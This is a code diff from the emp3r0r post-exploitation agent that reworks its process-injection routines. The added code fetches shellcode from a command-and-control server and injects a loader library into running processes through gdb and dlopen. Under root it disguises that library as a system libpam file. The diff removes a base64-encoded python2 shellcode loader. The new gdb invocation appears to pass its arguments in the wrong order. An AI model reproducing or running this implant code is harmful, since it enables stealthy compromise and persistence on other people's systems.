@@ -5,6 +5,7 @@ package agent
 import (
 	"encoding/hex"
 	"fmt"
+	"io/ioutil"
 	"log"
 	"os"
 	"os/exec"
@@ -14,16 +15,29 @@ import (
 	"syscall"
 
 	emp3r0r_data "github.com/jm33-m0/emp3r0r/core/lib/data"
-	"github.com/jm33-m0/emp3r0r/core/lib/tun"
 	"github.com/jm33-m0/emp3r0r/core/lib/util"
+	golpe "github.com/jm33-m0/go-lpe"
 )
 
-// gdbInjectShellcode inject shellcode to a running process using GDB
-// start a `sleep` process and inject to it if pid == 0
-// modify /proc/sys/kernel/yama/ptrace_scope if gdb does not work
-// gdb command: set (char[length])*(int*)$rip = { 0xcc }
-// FIXME does not work
-func gdbInjectShellcode(shellcode *string, pid, shellcodeLen int) error {
+// inject a shared library using dlopen
+func gdbInjectSO(path_to_so string, pid int) error {
+	gdb_path := emp3r0r_data.UtilsPath + "/gdb"
+	if !util.IsFileExist(gdb_path) {
+		res := VaccineHandler()
+		if !strings.Contains(res, "success") {
+			return fmt.Errorf("Download gdb via VaccineHandler: %s", res)
+		}
+	}
+
+	temp := "/tmp/emp3r0r"
+	if util.IsFileExist(temp) {
+		os.RemoveAll(temp) // ioutil.WriteFile returns "permission denied" when target file exists, can you believe that???
+	}
+	err := CopySelfTo(temp)
+	if err != nil {
+		return err
+	}
+
 	if pid == 0 {
 		cmd := exec.Command("sleep", "10")
 		err := cmd.Start()
@@ -33,72 +47,14 @@ func gdbInjectShellcode(shellcode *string, pid, shellcodeLen int) error {
 		pid = cmd.Process.Pid
 	}
 
-	out, err := exec.Command(emp3r0r_data.UtilsPath+"/gdb", "-q", "-ex", fmt.Sprintf("set (char[%d]*(int*)$rip={%s})", shellcodeLen, *shellcode), "-ex", "c", "-ex", "q", "-p", strconv.Itoa(pid)).CombinedOutput()
+	out, err := exec.Command(emp3r0r_data.UtilsPath+"/bash", "-c",
+		fmt.Sprintf(`echo 'print __libc_dlopen_mode("%s", 2)' | %s -p %d`,
+			gdb_path,
+			path_to_so,
+			pid)).CombinedOutput()
 	if err != nil {
-		return fmt.Errorf("GDB failed (shellcode length %d): %s\n%v", shellcodeLen, out, err)
+		return fmt.Errorf("GDB failed: %s\n%v", out, err)
 	}
-
-	return nil
-}
-
-// pyShellcodeLoader pure python, using ptrace
-func pyShellcodeLoader(shellcode *string, shellcodeLen int) error {
-	if !util.IsCommandExist("python2") {
-		return fmt.Errorf("python2 is not found, shellcode loader won't work")
-	}
-
-	// format
-	*shellcode = strings.Replace(*shellcode, ",", "", -1)
-	*shellcode = strings.Replace(*shellcode, "0x", "\\x", -1)
-
-	// python2 shellcode loader template
-	pyloader := fmt.Sprintf(`
-import ctypes
-import sys
-from ctypes.util import find_library
-
-PROT_READ = 0x01
-PROT_WRITE = 0x02
-PROT_EXEC = 0x04
-MAP_PRIVATE = 0X02
-MAP_ANONYMOUS = 0X20
-ENOMEM = -1
-
-SHELLCODE = "%s"
-
-libc = ctypes.CDLL(find_library('c'))
-
-mmap = libc.mmap
-mmap.argtypes = [ctypes.c_void_p, ctypes.c_size_t,
-				 ctypes.c_int, ctypes.c_int, ctypes.c_int, ctypes.c_size_t]
-mmap.restype = ctypes.c_void_p
-
-page_size = ctypes.pythonapi.getpagesize()
-sc_size = len(SHELLCODE)
-mem_size = page_size * (1 + sc_size/page_size)
-
-cptr = mmap(0, mem_size, PROT_READ | PROT_WRITE |
-			PROT_EXEC, MAP_PRIVATE | MAP_ANONYMOUS,
-			-1, 0)
-
-if cptr == ENOMEM:
-	sys.exit("mmap")
-
-if sc_size <= mem_size:
-	ctypes.memmove(cptr, SHELLCODE, sc_size)
-	sc = ctypes.CFUNCTYPE(ctypes.c_void_p, ctypes.c_void_p)
-	call_sc = ctypes.cast(cptr, sc)
-	call_sc(None)
-`, *shellcode)
-
-	encPyloader := tun.Base64Encode(pyloader)
-	cmd := fmt.Sprintf(`echo "exec('%s'.decode('base64'))"|python2`, encPyloader)
-	out, err := exec.Command("sh", "-c", cmd).CombinedOutput()
-	if err != nil {
-		log.Printf("python2 shellcode loader: %v\n%s", err, out)
-		return fmt.Errorf("pyloader: %v\n%s", err, out)
-	}
-	log.Printf("python2 loader has loaded %d of shellcode: %s", shellcodeLen, out)
 
 	return nil
 }
@@ -260,31 +216,53 @@ func Injector(shellcode *string, pid int) error {
 	return nil
 }
 
+// Inject loader.so into any process
+func GDBInjectSO(pid int) error {
+	so_path := emp3r0r_data.UtilsPath + "/libtinfo.1.2.so"
+	if os.Geteuid() == 0 {
+		root_so_path := "/usr/lib/x86_64-linux-gnu/libpam.so.0.0.1"
+		so_path = root_so_path
+	}
+	if !util.IsFileExist(so_path) {
+		out, err := golpe.ExtractFileFromString(emp3r0r_data.LoaderSO_Data)
+		if err != nil {
+			return fmt.Errorf("Extract loader.so failed: %v", err)
+		}
+		err = ioutil.WriteFile(so_path, out, 0644)
+		if err != nil {
+			return fmt.Errorf("Write loader.so failed: %v", err)
+		}
+	}
+	return gdbInjectSO(so_path, pid)
+}
+
 // InjectShellcode inject shellcode to a running process using various methods
 func InjectShellcode(pid int, method string) (err error) {
 	// prepare the shellcode
-	sc, err := DownloadViaCC(emp3r0r_data.CCAddress+"www/shellcode.txt", "")
+	prepare_sc := func() (shellcode string, shellcodeLen int) {
+		sc, err := DownloadViaCC(emp3r0r_data.CCAddress+"www/shellcode.txt", "")
 
-	if err != nil {
-		log.Printf("Failed to download shellcode.txt from CC: %v", err)
-		sc = []byte(emp3r0r_data.GuardianShellcode)
-		err = CopySelfTo(emp3r0r_data.GuardianAgentPath)
 		if err != nil {
-			return
+			log.Printf("Failed to download shellcode.txt from CC: %v", err)
+			sc = []byte(emp3r0r_data.GuardianShellcode)
+			err = CopySelfTo(emp3r0r_data.GuardianAgentPath)
+			if err != nil {
+				return
+			}
 		}
+		shellcode = string(sc)
+		shellcodeLen = strings.Count(string(shellcode), "0x")
+		log.Printf("Downloaded %d of shellcode, preparing to inject", shellcodeLen)
+		return
 	}
-	shellcode := string(sc)
-	shellcodeLen := strings.Count(string(shellcode), "0x")
-	log.Printf("Downloaded %d of shellcode, preparing to inject", shellcodeLen)
 
 	// dispatch
 	switch method {
 	case "gdb":
-		err = gdbInjectShellcode(&shellcode, pid, shellcodeLen)
+		err = GDBInjectSO(pid)
 	case "native":
+		shellcode, _ := prepare_sc()
 		err = Injector(&shellcode, pid)
-	case "python":
-		err = pyShellcodeLoader(&shellcode, shellcodeLen)
 	default:
 		err = fmt.Errorf("%s is not supported", method)
 	}
